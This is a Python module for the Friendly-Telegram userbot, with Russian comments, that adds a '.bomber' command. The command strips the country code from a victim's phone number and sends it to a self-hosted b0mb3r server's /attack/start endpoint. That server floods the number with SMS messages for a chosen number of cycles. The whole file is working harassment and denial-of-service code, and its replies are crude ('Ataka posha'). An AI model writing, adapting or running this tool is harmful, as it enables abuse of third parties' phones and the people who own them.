# Накодено Деменкопом.
# Используя API b0mb3r'а от crinny

# Version 1.0
# В поля bomber_ip и bomber_port вставьте значения
# вашего сервера с запущеным на ним b0mb3r'ом

from .. import loader, utils
import requests

def register(cb):
    cb(Bomber())

class Bomber(loader.Module):
    """Открытый и бесплатный СМС бомбер. Адаптирован для Friendly-telegram.
    Перед использованием введите ip и port в конфигурации Friendly-telegram"""
    strings = {
        "bomber_ip" : "",
        "bomber_port" : ""
    }


    def __init__(self):
        self.name = _("Bomber")
        self._me = None
        self._ratelimit = []
        self.config = loader.ModuleConfig("bomber_ip", None, lambda: self.strings["bomber_ip"],
                                          "bomber_port", None, lambda: self.strings["bomber_port"])

    async def client_ready(self, client, db):
        self._db = db
        self._client = client
        self._me = await client.get_me()

    async def bombercmd(self, message):
        """.bomber <Tel-number> <cycles>"""
        args = utils.get_args(message)
        serv = 'http://{}:{}/attack/start'.format(self.strings["bomber_ip"], self.strings["bomber_port"])
        chatid = str(message.chat_id)
        if len(args) < 2:
            await message.edit(_("Invalid syntax. Dibil, .help Bomber"))
        elif len(args) > 2:
            await message.edit(_("Error, sho ti vvodish?"))
        else:
            await message.edit(_("Ataka posha"))
            tel = args[0]
            cycls = args[1]
            if tel.startswith('+'):
                tel = tel.replace('+', '')
            if tel.startswith('7'):
                country = '7'
                tel = tel.replace('7', '', 1)
            elif tel.startswith('380'):
                country = '380'
                tel = tel.replace('380', '', 1)
            elif tel.startswith('375'):
                country = '375'
                tel = tel.replace('375', '', 1)
            else:
                country = ''
            params = {"phone_code":country, "phone":tel, "number_of_cycles":cycls}
            response = requests.post(serv, data=params)
            if response.json()['success']:
                await message.edit(_("Horoshaia ataka, номер телефона был: {}".format(tel)))
            else:
                await message.edit(_("Ну бля, тут проблема, не получилося. Ошибка: {}").format(response.json()['error_code']))
